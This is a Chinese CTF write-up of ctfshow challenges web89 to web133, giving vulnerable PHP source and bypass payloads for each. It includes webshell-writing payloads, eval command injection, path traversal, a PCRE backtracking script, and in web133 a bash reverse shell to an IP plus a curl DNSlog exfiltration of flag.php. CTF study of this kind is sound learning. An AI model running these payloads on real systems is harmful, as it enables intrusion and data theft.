---
uuid: 445118f4-1159-bb5b-fb45-1889ddfd0163
title: ctfshow--PHP特性
date: 2022-02-20 17:09:52
tags: 
    - ctfshow
    - web
    - wp
    - CTF
    - PHP特性
categories: 
    - [Web]
    - [CTF]
---
PHP特性
<!--more-->

# web89

![image-20220220171134262](https://img-blog.csdnimg.cn/img_convert/ce9b757d8b72117afe2c2d095efe44e7.png)

这个题`preg_match`过滤了0-9，只要发现有0-9，就会输出no，但是下面的intval函数的作用是返回变量的整数值，这样看两者就是矛盾的。

通过数组绕过，构造payload：`?num[]=`得到flag！

![image-20220220171451853](https://img-blog.csdnimg.cn/img_convert/e1ade2cd85b84cf26b9e6b873f14eeba.png)

# web90

![image-20220220171752853](https://img-blog.csdnimg.cn/img_convert/8afa8f8bdef14d1d836eafa06de398b6.png)

第一个if是验证num是否被设置，第二个if是验证num是否是4476，是的话就输出no，不是的话就继续第三个if，第三个if是验证num取整后是否等于4476.

> intval函数就是取整函数

这个就需要绕过第二个if的验证，直接输入小数取证绕过payload：`?num=4476.2`

![image-20220220172350545](https://img-blog.csdnimg.cn/img_convert/11a4dfdee70b8e024d0c89d091815848.png)

# web91

![image-20220220172524756](https://img-blog.csdnimg.cn/img_convert/9744fffffc0f6962c81ede92fb014a97.png)

这个题首先第一个if那一行的意思是匹配$a开头和结尾是php，如果是php，就进入下一个if条件

> /^php$/im表示开头，$表示结尾，/i表示不区分大小写，/m表示多行匹配

第二个if意思是匹配$a开头和结尾是php，不区分大小写，如果开头是php，就输出hacker。这个第二个过滤比第一个少了多行匹配/m。

了解一下`Apache HTTPD换行解析漏洞(CVE-2017-15715)`

[详情](https://blog.csdn.net/qq_46091464/article/details/108278486)

意思就是以前的1.php可以用1%0aphp访问，%0a表示换行符，所以这样就可以绕过函数的过滤，构造payload：`?cmd=a%0aphp`

a%0aphp,这个首先死preg_match中的$（匹配结尾）匹配a%0aphp中的换行符，这个时候会匹配到%0a(将%0a当作换行)，那么a%0aphp后面的php因为preg_match函数有个匹配多行就是单独的一行了，满足第一个if，开头结尾都是php

第二个if要求$a中开头和结尾没有php，而这个preg_match函数中没有/m（匹配多行），所以就直接匹配abc，abc不满足第二个if，所以输出flag！![image-20220220174250662](https://img-blog.csdnimg.cn/img_convert/220ce7c20cdaacd66dd5a92a5b1b5d9d.png)

# web92

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: Firebasky
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-18 16:29:30
# @link: https://ctfer.com

*/

include("flag.php");
highlight_file(__FILE__);
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if($num==4476){
        die("no no no!");
    }
    if(intval($num,0)==4476){
        echo $flag;
    }else{
        echo intval($num,0);
    }
}
```

源码表示判断是否有传入参数4476，以及参数取整后是不是4476，那么这个时候我们可以采用八进制的4476来进行绕过

`?num=010574`

![image.png](https://z4a.net/images/2022/06/14/image.png)

# web93

> 过滤了字母但是我们可以使用其他进制就是计算 0b?? : 二进制0??? : 八进制 0X?? : 16进制 payload ： ?num=010574

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: Firebasky
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-18 16:32:58
# @link: https://ctfer.com

*/

include("flag.php");
highlight_file(__FILE__);
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if($num==4476){
        die("no no no!");
    }
    if(preg_match("/[a-z]/i", $num)){
        die("no no no!");
    }
    if(intval($num,0)==4476){
        echo $flag;
    }else{
        echo intval($num,0);
    }
}
```

这里和上一题相比就是多了个过滤字母，上一题的方法还是不影响

![image1b459d5a53dc46da.png](https://z4a.net/images/2022/06/14/image1b459d5a53dc46da.png)

# web94

> 在93的基础上过滤了开头为0的数字 这样的话就不能使用进制转换来进行操作 我们可以使用小数点来进行操作。这样通过intval()函数就可以变为int类型的4476 ?num=4476.0

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-18 16:46:19
# @link: https://ctfer.com

*/

include("flag.php");
highlight_file(__FILE__);
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if($num==="4476"){
        die("no no no!");
    }
    if(preg_match("/[a-z]/i", $num)){
        die("no no no!");
    }
    if(!strpos($num, "0")){
        die("no no no!");
    }
    if(intval($num,0)===4476){
        echo $flag;
    }
}
```

num第一个值不能是0，也就是说十六进制的不能再使用了，又需要满足4476，那么可以4476.0

![image-20220808183725395](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208081837505.png?x-oss-process=hzy)

# web95

> 可以通过8进制绕过但是前面必须多加一个字节 ?num=+010574或者?num=%2b010574

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-18 16:53:59
# @link: https://ctfer.com

*/

include("flag.php");
highlight_file(__FILE__);
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if($num==4476){
        die("no no no!");
    }
    if(preg_match("/[a-z]|\./i", $num)){
        die("no no no!!");
    }
    if(!strpos($num, "0")){
        die("no no no!!!");
    }
    if(intval($num,0)===4476){
        echo $flag;
    }
}
```

这个过滤了点，八进制绕过，但是前面要多加一个字节，至于为啥我也不知道，记住就完了

![image-20220808185159298](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208081851367.png?x-oss-process=hzy)

# web96

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-18 19:21:24
# @link: https://ctfer.com

*/


highlight_file(__FILE__);

if(isset($_GET['u'])){
    if($_GET['u']=='flag.php'){    // 相当于过滤了flag.php
        die("no no no");
    }else{
        highlight_file($_GET['u']);
    }


}
```

./代表当前目录下的文件

![image-20220808185503275](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208081855342.png?x-oss-process=hzy)

# web97

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-18 19:36:32
# @link: https://ctfer.com

*/

include("flag.php");
highlight_file(__FILE__);
if (isset($_POST['a']) and isset($_POST['b'])) {
if ($_POST['a'] != $_POST['b'])
if (md5($_POST['a']) === md5($_POST['b']))  // md5相等值不相等，老考点了，且是强类型
echo $flag;
else
print 'Wrong.';
}
?>
```

强类型的话就用数组绕过

![image-20220808190116620](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208081901686.png?x-oss-process=hzy)

参考

[CTF中的md5弱类型](https://oceansec.blog.csdn.net/article/details/109856150?spm=1001.2101.3001.6650.2&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-2-109856150-blog-115377084.pc_relevant_default&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-2-109856150-blog-115377084.pc_relevant_default&utm_relevant_index=5)

# web98

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-18 21:39:27
# @link: https://ctfer.com

*/

include("flag.php");
$_GET?$_GET=&$_POST:'flag';
$_GET['flag']=='flag'?$_GET=&$_COOKIE:'flag';
$_GET['flag']=='flag'?$_GET=&$_SERVER:'flag';
highlight_file($_GET['HTTP_FLAG']=='flag'?$flag:__FILE__);

?>
```

这个考察php语法

直接传get，post  HTTP_FLAG=flag就行，中间那都没执行

![image-20220808192146728](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208081921830.png?x-oss-process=hzy)

参考

[php函数的传值与传址(引用)详解-php手册-PHP中文网](https://www.php.cn/php-notebook-172859.html)

[php三元运算符与if的详解-php教程-PHP中文网](https://www.php.cn/php-weizijiaocheng-383293.html)

# web99

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-18 22:36:12
# @link: https://ctfer.com

*/

highlight_file(__FILE__);
$allow = array();  // 数组
for ($i=36; $i < 0x36d; $i++) { 
    array_push($allow, rand(1,$i));   // 随机数
}
if(isset($_GET['n']) && in_array($_GET['n'], $allow)){   // in_array() 函数搜索数组中是否存在指定的值。但是这里没有设置第三个参数，
    file_put_contents($_GET['n'], $_POST['content']);
}

?>
```

[PHP in_array() 函数 (w3school.com.cn)](https://www.w3school.com.cn/php/func_array_in_array.asp)

写入1.php文件一句话木马

![image-20220808192947935](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208081929009.png?x-oss-process=hzy)

这个我弄了很久，都没有写进去🐎

![image-20220808193905867](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208081939939.png?x-oss-process=hzy)

![image-20220808193911588](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208081939663.png?x-oss-process=hzy)

![image-20220808193943714](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208081939765.png?x-oss-process=hzy)

# web100

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-21 22:10:28
# @link: https://ctfer.com

*/

highlight_file(__FILE__);
include("ctfshow.php");
//flag in class ctfshow;
$ctfshow = new ctfshow();
$v1=$_GET['v1'];
$v2=$_GET['v2'];
$v3=$_GET['v3'];
$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);
if($v0){
    if(!preg_match("/\;/", $v2)){
        if(preg_match("/\;/", $v3)){
            eval("$v2('ctfshow')$v3");  // 最终执行这个就会输出flag
        }
    }
    
}


?>
```

![image-20220808194935441](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208081949522.png?x-oss-process=hzy)

预期解是利用PHP中反射类ReflectionClass

![image-20220808195037651](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208081950721.png?x-oss-process=hzy)

# web101

就是上一题的预期

# web102

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: atao
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-23 20:59:43

*/


highlight_file(__FILE__);
$v1 = $_POST['v1'];
$v2 = $_GET['v2'];
$v3 = $_GET['v3'];
$v4 = is_numeric($v2) and is_numeric($v3);
if($v4){
    $s = substr($v2,2);
    $str = call_user_func($v1,$s);
    echo $str;
    file_put_contents($v3,$str);
}
else{
    die('hacker');
}
?>
```

> **is_numeric()** 函数用于检测变量是否为数字或数字字符串。

在php5下，is_numeric()可以识别十六进制

```
var_dump(is_numeric("0x55"));  #php5的环境下返回true  php7返回false
```

所以当处于php5环境下可以将马转成十六进制

```
GET:v2=0x3c3f706870206576616c28245f504f53545b315d293b3f3e&v3=1.php  #<?php eval($_POST[1]);?>
POST:v1=hex2bin
```

在php7环境下使用base64加密的shell

```
payload：
v2=115044383959474e6864434171594473&v3=php://filter/write=convert.base64-decode/resource=1.php  #<?=`cat *`;
POST：v1=hex2bin
```

![image-20220811231429531](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208112314622.png?x-oss-process=hzy)

# web103

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: atao
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-23 21:03:24

*/


highlight_file(__FILE__);
$v1 = $_POST['v1'];
$v2 = $_GET['v2'];
$v3 = $_GET['v3'];
$v4 = is_numeric($v2) and is_numeric($v3);
if($v4){
    $s = substr($v2,2);
    $str = call_user_func($v1,$s);
    echo $str;
    if(!preg_match("/.*p.*h.*p.*/i",$str)){
        file_put_contents($v3,$str);
    }
    else{
        die('Sorry');
    }
}
else{
    die('hacker');
}

?>
```

同上

# web104

```
<?php
highlight_file(__FILE__);
include("flag.php");

if(isset($_POST['v1']) && isset($_GET['v2'])){
    $v1 = $_POST['v1'];
    $v2 = $_GET['v2'];
    if(sha1($v1)==sha1($v2)){  // 要求sha1密文相等
        echo $flag;
    }
}
?>
```

数组绕过

![image-20220811231809971](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208112318051.png?x-oss-process=hzy)

官方hint给了两个相等sha1的值

```
#payload
aaK1STfY
0e76658526655756207688271159624026011393
aaO8zKZF
0e89257456677279068558073954252716165668
```

# web105

```
<?php
highlight_file(__FILE__);
include('flag.php');
error_reporting(0);
$error='你还想要flag嘛？';
$suces='既然你想要那给你吧！';
foreach($_GET as $key => $value){
    if($key==='error'){
        die("what are you doing?!");
    }
    $$key=$$value;
}foreach($_POST as $key => $value){
    if($value==='flag'){
        die("what are you doing?!");
    }
    $$key=$$value;
}
if(!($_POST['flag']==$flag)){
    die($error);
}
echo "your are good".$flag."\n";
die($suces);

?>
你还想要flag嘛？     // 只要让error和success任意一个值等于flag就能输出
```

变量覆盖

```
payload:

h=flag&flag=h
```

![image-20220811232123854](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208112321933.png?x-oss-process=hzy)

![image-20220811232515876](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208112325963.png?x-oss-process=hzy)

# web106

```
<?php

highlight_file(__FILE__);
include("flag.php");

if(isset($_POST['v1']) && isset($_GET['v2'])){
    $v1 = $_POST['v1'];
    $v2 = $_GET['v2'];
    if(sha1($v1)==sha1($v2) && $v1!=$v2){ // sha1密文相等，原值不相等
        echo $flag;
    }
}
?>
```

web104这题官方给的hint就可以用了，当然数组绕过也是可以的

![image-20220811232922300](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208112329386.png?x-oss-process=hzy)

# web107

```
<?php
highlight_file(__FILE__);
error_reporting(0);
include("flag.php");

if(isset($_POST['v1'])){
    $v1 = $_POST['v1'];
    $v3 = $_GET['v3'];
       parse_str($v1,$v2);  // 传入的v1的值解析到变量v2
       if($v2['flag']==md5($v3)){  // 判断
           echo $flag;
       }

}
?>
```

> parse_str() 函数把查询字符串解析到变量中。
>
> **注释：**如果未设置 *array* 参数，则由该函数设置的变量将覆盖已存在的同名变量。
>
> **注释：**php.ini 文件中的 magic_quotes_gpc 设置影响该函数的输出。如果已启用，那么在 parse_str() 解析之前，变量会被 addslashes() 转换。

这里这个函数可以解析成多个变量，这就是解题的关键。

![image-20220811233430821](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208112334902.png?x-oss-process=hzy)



# web108

```
<?php
highlight_file(__FILE__);
error_reporting(0);
include("flag.php");

if (ereg ("^[a-zA-Z]+$", $_GET['c'])===FALSE)  {
    die('error');

}
//只有36d的人才能看到flag
if(intval(strrev($_GET['c']))==0x36d){
    echo $flag;
}

?>
error
```

> `ereg()`函数搜索由指定的字符串作为由模式指定的字符串，如果发现模式则返回`true`，否则返回`false`。搜索对于字母字符是区分大小写的。 ereg函数存在NULL截断漏洞，存在00截断

相当于过滤了大小写字母

> **intval()** 函数用于获取变量的整数值。

> strrev()反转

0x36d十进制是877

![image-20220811233954689](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208112339762.png?x-oss-process=hzy)

# web109

```
<?php
highlight_file(__FILE__);
error_reporting(0);
if(isset($_GET['v1']) && isset($_GET['v2'])){
    $v1 = $_GET['v1'];
    $v2 = $_GET['v2'];

    if(preg_match('/[a-zA-Z]+/', $v1) && preg_match('/[a-zA-Z]+/', $v2)){  // 都过滤了大小写字母
            eval("echo new $v1($v2());");
    }

}

?>
```

```
v1和v2至少要匹配到一个字母，且v1和v2 new后面有一个类不报错
任意找一个php的内置类使得其不报错
payload: v1=ReflectionClass&v2=system('tac f*')
```

![image-20220811234321869](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208112343959.png?x-oss-process=hzy)

# web110

```
<?php
highlight_file(__FILE__);
error_reporting(0);
if(isset($_GET['v1']) && isset($_GET['v2'])){
    $v1 = $_GET['v1'];
    $v2 = $_GET['v2'];

    if(preg_match('/\~|\`|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]/', $v1)){
            die("error v1");
    }
    if(preg_match('/\~|\`|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]/', $v2)){
            die("error v2");
    }
    eval("echo new $v1($v2());");
}
?>
```

> ```
> getcwd()函数 获取当前工作目录
> 语法
> getcwd();
> ```

php原生类，可遍历目录类`FilesystemIterator`

```
?v1=FilesystemIterator&v2=getcwd
```

![image-20220811234645708](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208112346792.png?x-oss-process=hzy)

# web111

> 变量覆盖

```
<?php
highlight_file(__FILE__);
error_reporting(0);
include("flag.php");

function getFlag(&$v1,&$v2){
    eval("$$v1 = &$$v2;");
    var_dump($$v1);
}


if(isset($_GET['v1']) && isset($_GET['v2'])){
    $v1 = $_GET['v1'];
    $v2 = $_GET['v2'];

    if(preg_match('/\~| |\`|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]|\<|\>/', $v1)){
            die("error v1");
    }
    if(preg_match('/\~| |\`|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]|\<|\>/', $v2)){
            die("error v2");
    }
    
    if(preg_match('/ctfshow/', $v1)){
            getFlag($v1,$v2);
    }
}

?>
```

> `$GLOBALS` — 引用全局作用域中可用的全部变量
> 一个包含了全部变量的全局组合数组。变量的名字就是数组的键。



![image-20220811235901143](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208112359262.png?x-oss-process=hzy)

# web112

```
<?php
highlight_file(__FILE__);
error_reporting(0);
function filter($file){
    if(preg_match('/\.\.\/|http|https|data|input|rot13|base64|string/i',$file)){   // 过滤
        die("hacker!");
    }else{
        return $file;
    }
}
$file=$_GET['file'];
if(! is_file($file)){
    highlight_file(filter($file));
}else{
    echo "hacker!";
}
```

不能让is_file检测出是文件，并且 highlight_file可以识别为文件。这时候可以利用php伪协议。

![image-20220812000700195](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208120007282.png?x-oss-process=hzy)

# web113

> 函数绕过

```
<?php
highlight_file(__FILE__);
error_reporting(0);
function filter($file){
    if(preg_match('/filter|\.\.\/|http|https|data|data|rot13|base64|string/i',$file)){
        die('hacker!');
    }else{
        return $file;
    }
}
$file=$_GET['file'];
if(! is_file($file)){
    highlight_file(filter($file));
}else{
    echo "hacker!";
}
```

> 在linux中/proc/self/root是指向根目录的，也就是如果在命令行中输入ls /proc/self/root，其实显示的内容是根目录下的内容

```
file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php
```

![image-20220812180843433](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208121808524.png?x-oss-process=hzy)

# web114

```
<?php
error_reporting(0);
highlight_file(__FILE__);
function filter($file){
    if(preg_match('/compress|root|zip|convert|\.\.\/|http|https|data|data|rot13|base64|string/i',$file)){
        die('hacker!');
    }else{
        return $file;
    }
}
$file=$_GET['file'];
echo "师傅们居然tql都是非预期 哼！";
if(! is_file($file)){
    highlight_file(filter($file));
}else{
    echo "hacker!";
} 师傅们居然tql都是非预期 哼！
```

伪协议直接读

![image-20220812181006061](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208121810136.png?x-oss-process=hzy)

# web115

```
<?php
include('flag.php');
highlight_file(__FILE__);
error_reporting(0);
function filter($num){
    $num=str_replace("0x","1",$num);
    $num=str_replace("0","1",$num);
    $num=str_replace(".","1",$num);
    $num=str_replace("e","1",$num);
    $num=str_replace("+","1",$num);
    return $num;
}
$num=$_GET['num'];
if(is_numeric($num) and $num!=='36' and trim($num)!=='36' and filter($num)=='36'){
    if($num=='36'){
        echo $flag;
    }else{
        echo "hacker!!";
    }
}else{
    echo "hacker!!!";
} hacker!!!
```

trim函数的绕过+is_numeric绕过

```
?num=%0c36
```

![image-20220812181315997](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208121813083.png?x-oss-process=hzy)


> 知识点补充
>
> ```
> trim(string,charlist)
> 语法：
> 
> 参数	               描述
> string	        必需。规定要检查的字符串。
> charlist	    可选。规定从字符串中删除哪些字符。如果省略该参数，则移除下列所有字符：
> 
> "\0"       - NULL
> "\t"       - 制表符
> "\n"       - 换行
> "\x0B"     - 垂直制表符
> "\r"       - 回车
> " "        - 空格
> 
> ```
>
> trim+is_numeric之后留下的只有+ - . 和%0c，其中%0c是换页符

# web123

> 突破函数禁用

```
<?php
error_reporting(0);
highlight_file(__FILE__);
include("flag.php");
$a=$_SERVER['argv'];
$c=$_POST['fun'];
if(isset($_POST['CTF_SHOW'])&&isset($_POST['CTF_SHOW.COM'])&&!isset($_GET['fl0g'])){
    if(!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\{|\}|\"|\'|\,|\.|\;|\?/", $c)&&$c<=18){
         eval("$c".";");  
         if($fl0g==="flag_give_me"){
             echo $flag;
         }
    }
}
?>
```

> 在php中变量名只有数字字母下划线，被get或者post传入的变量名，如果含有空格、+、[则会被转化为_，所以按理来说我们构造不出CTF_SHOW.COM这个变量(因为含有.)，但php中有个特性就是如果传入[，它被转化为_之后，后面的字符就会被保留下来不会被替换

```,COM
所以传入?CTF_SHOW=&CTF[SHOW.COM=&fun=echo%20$flag
```

![image-20220812182500549](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208121825630.png?x-oss-process=hzy)

# web125

> php特性

```
<?php
error_reporting(0);
highlight_file(__FILE__);
include("flag.php");
$a=$_SERVER['argv'];
$c=$_POST['fun'];
if(isset($_POST['CTF_SHOW'])&&isset($_POST['CTF_SHOW.COM'])&&!isset($_GET['fl0g'])){
    if(!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\{|\}|\"|\'|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print/i", $c)&&$c<=16){
         eval("$c".";");
         if($fl0g==="flag_give_me"){
             echo $flag;
         }
    }
}
?>
```

过滤了echo，flag

```
get： huang=flag.php
post: ?CTF_SHOW=&CTF[SHOW.COM=&fun=highlight_file($_GET[huang])
```

![image-20220812182934133](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208121829226.png?x-oss-process=hzy)

# web126

> php特性

```
<?php
error_reporting(0);
highlight_file(__FILE__);
include("flag.php");
$a=$_SERVER['argv'];
$c=$_POST['fun'];
if(isset($_POST['CTF_SHOW'])&&isset($_POST['CTF_SHOW.COM'])&&!isset($_GET['fl0g'])){
    if(!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\{|\}|\"|\'|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print|g|i|f|c|o|d/i", $c) && strlen($c)<=16){
         eval("$c".";");  
         if($fl0g==="flag_give_me"){
             echo $flag;
         }
    }
}
```

限制了长度，g i f c o d

```
get: ?$fl0g=flag_give_me;
post: CTF_SHOW=&CTF[SHOW.COM=&fun=eval($a[0])
```

![image-20220812183301371](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208121833480.png?x-oss-process=hzy)

# web127

```
<?php
error_reporting(0);
include("flag.php");
highlight_file(__FILE__);
$ctf_show = md5($flag);
$url = $_SERVER['QUERY_STRING'];


//特殊字符检测
function waf($url){
    if(preg_match('/\`|\~|\!|\@|\#|\^|\*|\(|\)|\\$|\_|\-|\+|\{|\;|\:|\[|\]|\}|\'|\"|\<|\,|\>|\.|\\\|\//', $url)){
        return true;
    }else{
        return false;
    }
}

if(waf($url)){
    die("嗯哼？");
}else{
    extract($_GET);
}


if($ctf_show==='ilove36d'){
    echo $flag;
}
```

> extract() 函数从数组中将变量导入到当前的符号表，使用数组键名作为变量名，使用数组键值作为变量值

![image-20220812183658071](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208121836153.png?x-oss-process=hzy)

# web128

> 骚操作

```
<?php
error_reporting(0);
include("flag.php");
highlight_file(__FILE__);

$f1 = $_GET['f1'];
$f2 = $_GET['f2'];

if(check($f1)){
    var_dump(call_user_func(call_user_func($f1,$f2)));
}else{
    echo "嗯哼？";
}

function check($str){
    return !preg_match('/[0-9]|[a-z]/i', $str);
} NULL
```

> f1不能有数字或者字母，然后call_user_func在102讲过，call_user_func() 函数用于调用方法或者变量，第一个参数是被调用的函数，第二个是调用的函数的参数。

> get_defined_vars ( void ) : array 函数返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量。

```
?f1=_&f2=get_defined_vars
过程是
var_dump(call_user_func(call_user_func($f1,$f2)));
var_dump(call_user_func(call_user_func(_,'get_defined_vars')));
var_dump(call_user_func(get_defined_vars));//输出数组
```

![image-20220812184207684](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208121842822.png?x-oss-process=hzy)

# web129

```
<?php
error_reporting(0);
highlight_file(__FILE__);
if(isset($_GET['f'])){
    $f = $_GET['f'];
    if(stripos($f, 'ctfshow')>0){
        echo readfile($f);
    }
}
```

> stripos() 函数查找字符串在另一字符串中第一次出现的位置（不区分大小写）。

检测到ctfshow的时候必须是大于0的位置，然后就可以读文件

![image-20220812184810918](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208121848997.png?x-oss-process=hzy)

# web130

> very very very（省略25万个very）ctfshow

```
<?php
error_reporting(0);
highlight_file(__FILE__);
include("flag.php");
if(isset($_POST['f'])){
    $f = $_POST['f'];

    if(preg_match('/.+?ctfshow/is', $f)){
        die('bye!');
    }
    if(stripos($f, 'ctfshow') === FALSE){
        die('bye!!');
    }

    echo $flag;

}
```

只是过滤小写

![image-20220812185015448](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208121850533.png?x-oss-process=hzy)

# web131

```
<?php
error_reporting(0);
highlight_file(__FILE__);
include("flag.php");
if(isset($_POST['f'])){
    $f = (String)$_POST['f'];

    if(preg_match('/.+?ctfshow/is', $f)){
        die('bye!');
    }
    if(stripos($f,'36Dctfshow') === FALSE){
        die('bye!!');
    }

    echo $flag;

}
```

正则表达式进行匹配，回溯绕过安全机制

```
import requests

url='http://3d994b30-c182-4f9d-9eb3-2cfff11100f2.challenge.ctf.show/'
data={
    'f':'a'*1000000+'36Dctfshow'
}
r=requests.post(url=url,data=data).text
print(r)


```

![image-20221005153232312](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210051532422.png?x-oss-process=hzy)

[PHP利用PCRE回溯次数限制绕过某些安全限制 | 离别歌 (leavesongs.com)](https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html)

# web132

![image-20221005153431272](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210051534386.png?x-oss-process=hzy)

一个网站，扫目录发现/admin/index.php,得到如下源码

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-10-13 06:22:13
# @Last Modified by:   h1xa
# @Last Modified time: 2020-10-13 20:05:36
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

#error_reporting(0);
include("flag.php");
highlight_file(__FILE__);


if(isset($_GET['username']) && isset($_GET['password']) && isset($_GET['code'])){
    $username = (String)$_GET['username'];
    $password = (String)$_GET['password'];
    $code = (String)$_GET['code'];

    if($code === mt_rand(1,0x36D) && $password === $flag || $username ==="admin"){
        
        if($code == 'admin'){
            echo $flag;
        }
        
    }
}
```

> ||的优先级低于&&
>
> mt_rand()函数用于生成随机数

![image-20221005154826719](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210051548474.png?x-oss-process=hzy)

可以看到只需要满足username=‘admin’就可以

![image-20221005155034805](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210051550888.png?x-oss-process=hzy)

# web133

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: Firebasky
# @Date:   2020-10-13 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-10-13 16:43:44

*/

error_reporting(0);
highlight_file(__FILE__);
//flag.php
if($F = @$_GET['F']){
    if(!preg_match('/system|nc|wget|exec|passthru|netcat/i', $F)){
        eval(substr($F,0,6));
    }else{
        die("6个字母都还不够呀?!");
    }
}
```

> substr函数返回指定长度的内容

这里就是把传参内容的前六个字符返回，所以直接?F=`$F` ;即可绕过然后后面执行命令

> ?F=`$F`; =》 ?F=``$F`;`; //第一次的$F是php变量，第二次的$F属于shell里的，所以不会无限套娃，里面`$F`;在shell里执行为空，linux里``也不回显，也不存在$F变量，没有任何输出

![image-20221005155805879](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210051558959.png?x-oss-process=hzy)

发现可以执行命令但是没回显，需要外带，bash失败，用curl

```
bash -i >& /dev/tcp/43.138.40.212/7777 0>&1
```

```
?F=`$F`; curl `cat flag.php|grep "flag"`.mp0kz9.dnslog.cn
```

![image-20221005163631746](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210051636826.png?x-oss-process=hzy)

